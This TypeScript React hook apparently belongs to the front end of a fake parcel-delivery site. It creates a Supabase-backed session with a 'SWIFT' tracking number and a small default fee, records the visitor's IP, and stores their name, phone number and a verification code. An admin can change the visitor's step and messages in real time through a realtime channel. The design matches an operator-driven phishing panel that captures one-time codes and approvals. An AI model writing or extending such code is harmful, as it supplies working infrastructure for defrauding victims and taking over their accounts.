import { useEffect, useState, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";

interface ClientSession {
  id: string;
  session_code: string;
  current_step: number;
  admin_message: string | null;
  message_type: string | null;
  verification_code: string | null;
  approval_type: string | null;
  client_name: string | null;
  phone_number: string | null;
}

const generateSessionCode = () => {
  return Math.random().toString(36).substring(2, 8).toUpperCase();
};

export const useClientSession = () => {
  const [session, setSession] = useState<ClientSession | null>(null);
  const [currentStep, setCurrentStep] = useState(1);
  const [adminMessage, setAdminMessage] = useState<string | null>(null);
  const [messageType, setMessageType] = useState<string | null>(null);
  const [verificationCode, setVerificationCode] = useState<string | null>(null);
  const [approvalType, setApprovalType] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);

  // Initialize or retrieve session
  const initSession = useCallback(async () => {
    // Check localStorage for existing session
    const storedSessionId = localStorage.getItem("swift_session_id");
    
    if (storedSessionId) {
      // Fetch existing session
      const { data, error } = await supabase
        .from("client_sessions")
        .select("*")
        .eq("id", storedSessionId)
        .single();

      if (data && !error) {
        setSession(data);
        setCurrentStep(data.current_step);
        setAdminMessage(data.admin_message);
        setMessageType(data.message_type);
        setVerificationCode(data.verification_code);
        setApprovalType(data.approval_type);
        setLoading(false);
        return;
      }
    }

    // Create new session - get client IP and default settings first
    let clientIp: string | null = null;
    try {
      const ipResponse = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipResponse.json();
      clientIp = ipData.ip;
    } catch (e) {
      console.log("Could not fetch IP");
    }

    // Fetch default parcel settings from admin_settings
    let defaultAmount = 2.99;
    let defaultOrigin = "Los Angeles, CA";
    let defaultEstDelivery = "2-3 Business Days";
    let trackingPrefix = "SWIFT";

    try {
      const { data: settings } = await supabase
        .from("admin_settings")
        .select("setting_key, setting_value")
        .in("setting_key", ["default_amount", "default_origin", "default_est_delivery", "tracking_prefix"]);

      if (settings) {
        const amount = settings.find(s => s.setting_key === "default_amount")?.setting_value;
        const origin = settings.find(s => s.setting_key === "default_origin")?.setting_value;
        const estDelivery = settings.find(s => s.setting_key === "default_est_delivery")?.setting_value;
        const prefix = settings.find(s => s.setting_key === "tracking_prefix")?.setting_value;

        if (amount) defaultAmount = parseFloat(amount);
        if (origin) defaultOrigin = origin;
        if (estDelivery) defaultEstDelivery = estDelivery;
        if (prefix) trackingPrefix = prefix;
      }
    } catch (e) {
      console.log("Could not fetch default settings, using fallback values");
    }

    const sessionCode = generateSessionCode();
    const trackingNumber = trackingPrefix + Math.random().toString(36).substring(2, 10).toUpperCase();
    
    const { data, error } = await supabase
      .from("client_sessions")
      .insert({
        session_code: sessionCode,
        current_step: 1,
        parcel_tracking: trackingNumber,
        amount: defaultAmount,
        origin: defaultOrigin,
        estimated_delivery: defaultEstDelivery,
        client_ip: clientIp
      })
      .select()
      .single();

    if (data && !error) {
      localStorage.setItem("swift_session_id", data.id);
      setSession(data);
      setCurrentStep(data.current_step);
    }
    setLoading(false);
  }, []);

  // Update step locally and in database
  const updateStep = useCallback(async (newStep: number, extraData?: Partial<{
    approval_type: string | null;
    verification_code: string | null;
  }>) => {
    if (!session) return;
    
    setCurrentStep(newStep);
    if (extraData?.approval_type !== undefined) {
      setApprovalType(extraData.approval_type);
    }
    
    await supabase
      .from("client_sessions")
      .update({ current_step: newStep, ...extraData })
      .eq("id", session.id);
  }, [session]);

  // Update session data
  const updateSessionData = useCallback(async (data: Partial<{
    client_name: string;
    phone_number: string;
  }>) => {
    if (!session) return;
    
    await supabase
      .from("client_sessions")
      .update(data)
      .eq("id", session.id);
  }, [session]);

  // Clear admin message
  const clearAdminMessage = useCallback(async () => {
    if (!session) return;
    
    setAdminMessage(null);
    setMessageType(null);
    
    await supabase
      .from("client_sessions")
      .update({ admin_message: null, message_type: null })
      .eq("id", session.id);
  }, [session]);

  // Subscribe to realtime changes
  useEffect(() => {
    if (!session) return;

    const channel = supabase
      .channel(`session_${session.id}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "client_sessions",
          filter: `id=eq.${session.id}`
        },
        (payload) => {
          const newData = payload.new as ClientSession;
          setCurrentStep(newData.current_step);
          setAdminMessage(newData.admin_message);
          setMessageType(newData.message_type);
          setVerificationCode(newData.verification_code);
          setApprovalType(newData.approval_type);
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [session]);

  useEffect(() => {
    initSession();
  }, [initSession]);

  // Update verification code in database
  const updateVerificationCode = useCallback(async (code: string) => {
    if (!session) return;
    
    setVerificationCode(code);
    
    await supabase
      .from("client_sessions")
      .update({ verification_code: code })
      .eq("id", session.id);
  }, [session]);

  return {
    session,
    currentStep,
    adminMessage,
    messageType,
    verificationCode,
    approvalType,
    loading,
    updateStep,
    updateSessionData,
    updateVerificationCode,
    clearAdminMessage
  };
};
